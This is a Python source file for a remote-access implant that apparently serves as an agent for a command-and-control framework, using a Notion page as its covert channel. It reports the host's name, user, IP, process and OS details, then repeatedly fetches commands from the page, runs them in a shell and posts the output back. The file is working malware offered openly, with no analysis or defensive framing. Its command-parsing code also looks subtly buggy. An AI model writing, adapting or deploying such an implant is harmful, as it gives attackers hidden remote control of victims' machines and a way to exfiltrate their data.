import requests
import json
import socket
import time
import os
import sys
import base64
import random
import string
import platform

from notion.client import NotionClient

# Obtain the `token_v2` value by inspecting your browser cookies on a logged-in (non-guest) session on Notion.so
client = NotionClient(token_v2="PUT YOUR NOTION TOKEN HERE")
page = client.get_block("PUT YOUR NOTION PAGE URL HERE")
def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

magic = b"\x41\x41\x41\x41"
agentid = get_random_string(4).encode('utf-8')
sleeptime = 5
if platform.machine().endswith('64'):
    arch = "x64"
else:
    arch = "x86"

registered = ""
outputdata = ""
def register():
    global url
    global size
    global agentid
    global magic
                # Register info:
                #   - AgentID           : int [needed]
                #   - Hostname          : str [needed]
                #   - Username          : str [needed]
                #   - Domain            : str [optional]
                #   - InternalIP        : str [needed]
                #   - Process Path      : str [needed]
                #   - Process Name      : str [needed]
                #   - Process ID        : int [needed]
                #   - Process Parent ID : int [optional]
                #   - Process Arch      : str [needed]
                #   - Process Elevated  : int [needed]
                #   - OS Build          : str [needed]
                #   - OS Version        : str [needed]
                #   - OS Arch           : str [optional]
                #   - Sleep             : int [optional]
    hostname = socket.gethostname()
    # registerdict = {
    #     "AgentID":"bd92bde",
    #     "Hostname":"sadplaceholder",
    #     "Username":"sadplaceholder",
    #     "InternalIP":"0.0.0.0",
    #     "Process Path":"C:\\",
    #     "Process Name":"sad.exe",
    #     "Process ID":1,
    #     "Process Parent ID":2,
    #     "Process Arch":"x64",
    #     "Process Elevated":1,
    #     "OS Build":"sadplaceholder",
    #     "OS Version":"sadplaceholder",
    #     "OS Arch":"x64",
    #     "Sleep":5,
    # }
    registerdict = {
    "AgentID": str(agentid),
    "Hostname": hostname,
    "Username": os.getlogin(),
    "Domain": "",
    "InternalIP": socket.gethostbyname(hostname),
    "Process Path": os.getcwd(),
    "Process ID": str(os.getpid()),
    "Process Parent ID": "0",
    "Process Arch": "x64",
    "Process Elevated": 0,
    "OS Build": "NOT IMPLEMENTED YET",
    "OS Arch": arch,
    "Sleep": 1,
    "Process Name": "python",
    "OS Version": str(platform.version())
    }
    registerblob = json.dumps(registerdict)


    requestdict = {"task":"register","data":registerblob}
    requestblob = json.dumps(requestdict)
    size = len(requestblob) + 12
    size_bytes = size.to_bytes(4, 'big')
    agentheader = size_bytes + magic + agentid
    #print(agentheader+registerblob.encode("utf-8"))
    page.children[1].title += "%_SEPARATOR_%"+base64.b64encode(agentheader+requestblob.encode('utf-8')).decode('utf-8')
    
    isregistered = ""
    while isregistered != "registered":
        time.sleep(1)
        page.refresh()
        print(isregistered)
        isregistered = base64.b64decode(page.children[0].title).decode()
    return str(isregistered)


def checkin(data):
    print("Checking in for taskings")
    requestdict = {"task":"gettask","data":data}
    requestblob = json.dumps(requestdict)
    size = len(requestblob) + 12
    size_bytes = size.to_bytes(4, 'big')
    agentheader = size_bytes + magic + agentid
    page.refresh()
    #print(page.children)
    taskings = base64.b64decode(page.children[0].title)
    #print(taskings)
    if len(taskings) > 0:
        page.children[0].title = ""
        print("Received taskings")
    print(f"Returning {len(data.strip())} bytes of data: " + data)
    page.children[1].title += "%_SEPARATOR_%"+base64.b64encode(agentheader+requestblob.encode('utf-8')).decode('utf-8')
    return taskings
    

#register the agent
while registered != "registered":
    registered = register()
    page.children[0].title = ""

print("REGISTERED!")

def runcommand(command):
    command = command.strip(b"\x00").decode('utf-8')
    if command == "goodbye":
        sys.exit(2)
    output = os.popen(command).read() + "\n"
    return output


#checkin for commands
while True:
    commands = checkin(outputdata)
    outputdata = ""
    #print(commands)
    while len(commands) > 4:
        first_4_bytes = commands[:4]
        #print(first_4_bytes)
        size_of_command = int.from_bytes(first_4_bytes, 'little')
        commands = commands.lstrip(first_4_bytes)
        commands = command = commands[:size_of_command]
        commands = commands.lstrip(commands[:size_of_command])
        print(f"Size:{size_of_command}, command:{command}, Size (commands):{str(len(commands))}, commands:{commands}")
        outputdata += runcommand(command)

    time.sleep(sleeptime)

